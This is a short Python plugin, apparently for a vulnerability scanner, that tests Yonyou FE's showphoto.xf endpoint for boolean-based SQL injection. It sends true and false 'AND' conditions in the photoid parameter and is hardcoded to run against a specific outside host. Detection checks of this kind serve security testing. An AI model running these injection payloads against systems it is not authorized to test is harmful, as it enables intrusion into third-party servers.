#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#author:range
#refer:

def assign(service, arg): 
    if service == "yongyou_fe": 
        return True, arg 

def audit(arg):
    playload1 = 'showphoto.xf?photoid=1%20AND%2076%3D69'
    playload2 = 'showphoto.xf?photoid=1%20AND%2076%3D76'
    url1 = arg + playload1
    url2 = arg + playload2
    code1, head1, res1, errcode, _ = curl.curl2(url1)
    code2, head2, res2, errcode, _ = curl.curl2(url2)
    print head1,head2
    if code1 == 200 and code2==200 and 'image' in head1 and 'image' in head2 and len(res1)==0 and len(res2)!=0: 
        security_hole(arg + '/showphoto.xf?photoid=1')

if __name__ == '__main__': 
    from dummy import * 
    audit(assign('yongyou_fe', 'http://gzwnq.88ip.cn:9090/')[1])